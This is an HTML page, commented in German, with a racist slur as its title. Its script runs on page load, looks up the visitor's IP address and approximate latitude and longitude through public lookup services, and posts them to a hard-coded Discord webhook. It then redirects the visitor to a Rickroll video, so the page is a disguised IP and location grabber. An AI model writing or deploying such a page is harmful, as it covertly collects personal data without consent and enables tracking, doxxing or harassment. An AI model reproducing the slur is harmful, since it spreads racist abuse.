<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FUCK THE NIGGERS</title>
</head>
<body>
    <script>
        // Funktion um die IP-Adresse und den Standort des Benutzers zu erhalten
        async function getLocation() {
            try {
                // IP-Adresse abrufen
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ipAddress = data.ip;

                // Standort abrufen
                const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
                const geoData = await geoResponse.json();

                const latitude = geoData.latitude;
                const longitude = geoData.longitude;

                // Ihre Discord Webhook-URL
                const webhookUrl = 'https://discord.com/api/webhooks/1406376415208800326/bq32c4G7gYuEaZvwmELJ4ZOT_bLhUYZAoXRaSz3VESQi6t2CV_Kq8WOah1JJMYgTfoWz';

                // Daten im JSON-Format vorbereiten
                const message = {
                    content: `IP: ${ipAddress}, Latitude: ${latitude}, Longitude: ${longitude}`
                };

                // Fetch-Request an den Webhook senden
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });

                // Weiterleitung zur Rickroll-Seite
                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
            } catch (error) {
                console.error('Error:', error);
                // Weiterleitung zur Rickroll-Seite, falls ein Fehler auftritt
                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
            }
        }

        // Standort abrufen, wenn die Seite geladen wird
        getLocation();
    </script>
</body>
</html>
